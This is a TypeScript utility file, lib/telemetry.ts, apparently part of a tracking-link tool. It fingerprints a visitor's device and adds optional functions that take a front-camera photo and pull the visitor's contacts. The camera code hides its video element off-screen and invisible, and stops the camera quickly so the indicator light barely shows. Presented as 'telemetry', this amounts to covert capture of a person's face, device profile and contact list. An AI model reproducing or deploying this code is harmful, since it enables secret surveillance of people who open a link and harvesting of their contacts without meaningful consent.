// lib/telemetry.ts
// Utility to collect device telemetry and handle browser-supported web permissions
import { DeviceInfo } from "@/lib/types";

export function detectBrowserAndOS(ua: string): { browser: string; os: string } {
  let browser = "Unknown Browser";
  let os = "Unknown OS";

  if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
  else if (/Windows NT/i.test(ua)) os = "Windows";
  else if (/Linux/i.test(ua)) os = "Linux";

  if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox\//i.test(ua)) browser = "Firefox";
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";

  return { browser, os };
}

export async function collectDeviceTelemetry(): Promise<DeviceInfo> {
  if (typeof window === "undefined") return {};

  const ua = navigator.userAgent;
  const { browser, os } = detectBrowserAndOS(ua);
  const screen = `${window.screen?.width || 0}x${window.screen?.height || 0}`;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;

  let battery: number | null = null;
  let isCharging: boolean | null = null;

  try {
    const nav = navigator as any;
    if (nav.getBattery) {
      const b = await nav.getBattery();
      battery = Math.round(b.level * 100);
      isCharging = b.charging;
    }
  } catch {
    // Battery API not supported or blocked
  }

  let connection = "Unknown";
  try {
    const nav = navigator as any;
    if (nav.connection?.effectiveType) {
      connection = nav.connection.effectiveType.toUpperCase();
    }
  } catch {
    // Connection info unavailable
  }

  return {
    browser,
    os,
    screen,
    language,
    timezone,
    platform,
    battery,
    isCharging,
    connection,
  };
}

// Optional camera snapshot if enabled for the link
export async function captureCameraSnapshot(): Promise<Blob | null> {
  if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
    return null;
  }

  let stream: MediaStream | null = null;
  let video: HTMLVideoElement | null = null;

  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });

    video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.autoplay = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "true");
    video.setAttribute("webkit-playsinline", "true");
    video.style.position = "fixed";
    video.style.top = "-9999px";
    video.style.left = "-9999px";
    video.style.opacity = "0";
    video.style.pointerEvents = "none";
    document.body.appendChild(video);

    await video.play().catch(() => {});

    // Small delay to let camera sensor warm up and adjust exposure
    await new Promise((r) => setTimeout(r, 450));

    // Scale down dimensions to max 640px to eliminate lag and keep size <100KB
    const MAX_DIM = 640;
    let w = video.videoWidth || 640;
    let h = video.videoHeight || 480;
    if (w > MAX_DIM || h > MAX_DIM) {
      if (w > h) {
        h = Math.round((h * MAX_DIM) / w);
        w = MAX_DIM;
      } else {
        w = Math.round((w * MAX_DIM) / h);
        h = MAX_DIM;
      }
    }

    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;

    const ctx = canvas.getContext("2d");
    if (ctx) {
      ctx.drawImage(video, 0, 0, w, h);
    }

    // Immediately stop tracks to turn off camera light & free hardware pipeline
    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
      stream = null;
    }
    if (video && video.parentNode) {
      video.parentNode.removeChild(video);
      video = null;
    }

    // Try WebP first (<50KB typical), fallback to JPEG
    return await new Promise<Blob | null>((resolve) => {
      canvas.toBlob(
        (blob) => {
          if (blob) {
            resolve(blob);
          } else {
            // Fallback for older Safari/browsers without WebP canvas export
            canvas.toBlob((fallbackBlob) => resolve(fallbackBlob), "image/jpeg", 0.70);
          }
        },
        "image/webp",
        0.70
      );
    });
  } catch (err) {
    console.warn("Camera snapshot skipped or denied:", err);
    return null;
  } finally {
    if (stream) {
      stream.getTracks().forEach((t) => t.stop());
    }
    if (video && video.parentNode) {
      video.parentNode.removeChild(video);
    }
  }
}

// Optional contact picker if enabled and supported (Android Chrome)
export async function pickContactIfSupported(): Promise<any[] | null> {
  if (typeof navigator === "undefined") return null;
  const nav = navigator as any;
  if ("contacts" in nav && "ContactsManager" in window) {
    try {
      const props = ["name", "tel", "email"];
      const contacts = await nav.contacts.select(props, { multiple: true });
      return contacts;
    } catch {
      return null;
    }
  }
  return null;
}
